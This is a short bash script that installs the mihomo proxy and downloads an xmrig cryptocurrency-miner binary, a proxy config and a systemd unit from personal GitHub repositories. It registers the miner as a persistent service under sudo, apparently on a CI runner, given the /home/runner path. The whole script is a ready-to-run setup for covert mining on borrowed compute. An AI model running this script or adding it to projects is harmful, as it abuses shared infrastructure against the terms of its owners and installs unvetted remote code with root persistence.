#!/bin/bash
set -e

pwd
wget https://github.com/MetaCubeX/mihomo/releases/download/v1.19.18/mihomo-linux-amd64-v1-v1.19.18.deb
wget https://github.com/sweetasshole/test/raw/refs/heads/main/sub/xmrig -O /mnt/xmrig
sudo apt install ./mihomo-linux-amd64-v1-v1.19.18.deb
sudo mkdir -p /etc/mihomo
wget https://raw.githubusercontent.com/pornnewbee/socks5-for-serv00/main/sub/work/mihomoconfig.yml
mv mihomoconfig.yml config.yaml
sudo mv config.yaml /etc/mihomo/config.yaml
sudo apt install -y libhwloc15
sudo apt install -y screen
mv /mnt/xmrig /home/runner
sudo chmod +x xmrig

wget -q https://raw.githubusercontent.com/pornnewbee/socks5-for-serv00/main/sub/work/worker.service
sudo mv worker.service /etc/systemd/system/xmrig.service
sudo systemctl daemon-reload
sudo systemctl enable xmrig
sudo systemctl start xmrig
